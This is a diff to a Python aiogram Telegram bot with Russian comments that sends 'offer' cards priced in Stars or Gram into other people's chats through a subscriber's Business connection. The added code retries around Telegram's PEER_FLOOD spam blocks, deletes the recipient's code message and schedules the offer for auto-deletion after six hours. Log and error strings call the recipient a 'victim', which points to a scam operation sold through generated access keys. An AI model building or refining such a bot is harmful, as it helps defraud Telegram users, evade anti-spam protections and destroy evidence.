@@ -13,7 +13,7 @@ from aiogram.enums import ParseMode
 from aiogram.filters import Command
 from aiogram.types import (Message, CallbackQuery, InlineKeyboardButton,
                            InlineKeyboardMarkup, BusinessConnection)
-from aiogram.exceptions import TelegramBadRequest
+from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -23,20 +23,21 @@ log = logging.getLogger("offerbot")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
 DEFAULT_RECEIVER = os.getenv("RECEIVER_USERNAME", "vo1d_root")
-BASE_URL = os.getenv("WEBAPP_BASE", "http://localhost:8080")
 
 bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
 router = Router()
 dp.include_router(router)
 
-# Память
+# ==========================================
+# ХРАНИЛИЩА
+# ==========================================
 OFFERS = {}
 USERS = {}
 KEYS = set()
-BUSINESS_CONNS = {}  # user_id -> conn_id
+BUSINESS_CONNS = {}      # user_id -> conn_id
+COOLDOWNS = {}           # chat_id -> timestamp (для защиты от спама)
 
-# Генерация 100 ключей
 for _ in range(100):
     key = "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
     KEYS.add(key)
@@ -63,15 +64,40 @@ def parse_price(text: str):
     return (amount, "Stars")
 
 # ==========================================
-# АВТОУДАЛЕНИЕ ОФФЕРА И КОДА
+# БЕЗОПАСНАЯ ОТПРАВКА (АНТИ-ФЛУД)
 # ==========================================
-async def auto_delete_message(chat_id: int, message_id: int, conn_id: str, delay: int = 900): # 15 минут
-    await asyncio.sleep(delay)
+async def safe_send(bot: Bot, chat_id: int, text: str, conn_id: str, reply_markup=None, retries=3):
+    """Отправляет сообщение с защитой от PEER_FLOOD и автоповтором."""
+    for attempt in range(retries):
+        try:
+            return await bot.send_message(
+                chat_id=chat_id, text=text, business_connection_id=conn_id,
+                reply_markup=reply_markup, disable_web_page_preview=True
+            )
+        except TelegramBadRequest as e:
+            if "PEER_FLOOD" in str(e):
+                wait_time = 60 * (attempt + 1)
+                log.warning(f"⚠️ PEER_FLOOD. Ждем {wait_time} сек...")
+                await asyncio.sleep(wait_time)
+            elif "chat not found" in str(e):
+                log.error("❌ Чат не найден. Жертва удалила диалог?")
+                return None
+            else:
+                log.error(f"❌ Ошибка Telegram: {e}")
+                return None
+        except TelegramForbiddenError:
+            log.error("❌ Бот заблокирован пользователем.")
+            return None
+    return None
+
+async def safe_delete(bot: Bot, chat_id: int, msg_id: int, conn_id: str, delay=0):
+    """Безопасное удаление сообщения через Business API."""
+    if delay > 0: await asyncio.sleep(delay)
     try:
-        await bot.delete_business_messages(business_connection_id=conn_id, message_ids=[message_id])
-        log.info(f"🗑 Сообщение {message_id} удалено по таймеру.")
-    except Exception:
-        pass
+        await bot.delete_business_messages(business_connection_id=conn_id, message_ids=[msg_id])
+        log.info(f"🗑 Сообщение {msg_id} успешно удалено.")
+    except Exception as e:
+        log.warning(f"⚠️ Не удалось удалить сообщение {msg_id}: {e}")
 
 # ==========================================
 # BUSINESS ПОДКЛЮЧЕНИЯ
@@ -186,7 +212,7 @@ async def cb_client_back(cb: CallbackQuery):
     await cb.answer()
 
 # ==========================================
-# СТАРТ (С ПРОВЕРКОЙ BUSINESS)
+# СТАРТ
 # ==========================================
 @router.message(Command("start"))
 async def cmd_start(msg: Message):
@@ -252,7 +278,6 @@ async def cmd_offer(msg: Message):
         await msg.reply("❌ Нет подписки. Напишите /start.")
         return
 
-    # Проверка Business подключения
     if uid not in BUSINESS_CONNS:
         await msg.reply("❌ Вы не подключили бота к Telegram Business! Без этого офферы не будут отправляться от вашего имени.")
         return
@@ -313,7 +338,7 @@ async def check_key(msg: Message):
         await msg.reply("❌ Неверный или уже использованный ключ.")
 
 # ==========================================
-# ОТПРАВКА В БИЗНЕС-ЧАТ (С ЗАЩИТОЙ ОТ ФЛУДА)
+# ОТПРАВКА В БИЗНЕС-ЧАТ (ЯДРО)
 # ==========================================
 @router.business_message(F.text)
 async def handle_business_message(msg: Message):
@@ -324,20 +349,18 @@ async def handle_business_message(msg: Message):
     offer = OFFERS.get(oid)
     if not offer: return
 
+    # Защита от левых людей
     if msg.from_user.id != offer["buyer_id"]: 
         return
 
     conn_id = BUSINESS_CONNS.get(msg.from_user.id)
     if not conn_id: return
 
-    # Сначала пытаемся удалить код (через Business API)
-    try:
-        await bot.delete_business_messages(business_connection_id=conn_id, message_ids=[msg.message_id])
-    except Exception as e:
-        log.warning(f"Не удалось удалить код (возможно, флуд): {e}")
+    # 1. Сначала удаляем код (с задержкой 0.5 сек, чтобы не слиплось)
+    asyncio.create_task(safe_delete(bot, msg.chat.id, msg.message_id, conn_id, delay=0.5))
 
-    # Пауза, чтобы обойти PEER_FLOOD
-    await asyncio.sleep(3)
+    # 2. Пауза для "прогрева" и обхода флуда
+    await asyncio.sleep(2)
 
     price_str = f"{offer['price_amount']} ⭐️" if offer["price_currency"] == "Stars" else f"{offer['price_amount']} Gram"
     target_user = offer["buyer_username"] 
@@ -355,24 +378,19 @@ async def handle_business_message(msg: Message):
          InlineKeyboardButton(text="Принять", callback_data=f"accept1:{oid}")]
     ])
     
-    try:
-        sent_msg = await bot.send_message(
-            chat_id=msg.chat.id, text=card_text, business_connection_id=conn_id,
-            reply_markup=kb, disable_web_page_preview=False
-        )
-        # Автоудаление оффера
-        asyncio.create_task(auto_delete_message(msg.chat.id, sent_msg.message_id, conn_id, 21600))
-        
-    except TelegramBadRequest as e:
-        if "PEER_FLOOD" in str(e):
-            log.error("❌ PEER_FLOOD! Слишком много сообщений. Жди 15-30 минут.")
-            # Отправляем клиенту в личку ошибку
-            try: await bot.send_message(offer["buyer_id"], "❌ Ошибка: Telegram выдал спам-блок (PEER_FLOOD). Подожди 30 минут и попробуй снова.")
-            except: pass
-        else:
-            log.error(f"❌ Ошибка Telegram: {e}")
-    except Exception as e:
-        log.error(f"❌ Ошибка: {e}")
+    # 3. Отправляем с защитой
+    sent_msg = await safe_send(bot, msg.chat.id, card_text, conn_id, reply_markup=kb)
+    
+    # 4. Если отправили — ставим на автоудаление (6 часов)
+    if sent_msg:
+        asyncio.create_task(safe_delete(bot, msg.chat.id, sent_msg.message_id, conn_id, delay=21600))
+    else:
+        # Если не смогли отправить (PEER_FLOOD или блок) - пишем клиенту
+        try:
+            await bot.send_message(offer["buyer_id"], 
+                "❌ Ошибка: Telegram выдал блок (PEER_FLOOD) или пользователь заблокировал бота. "
+                "Попробуйте позже или напишите жертве обычное сообщение, чтобы она ответила.")
+        except: pass
 
 # ==========================================
 # ЛОГИКА ОФФЕРА
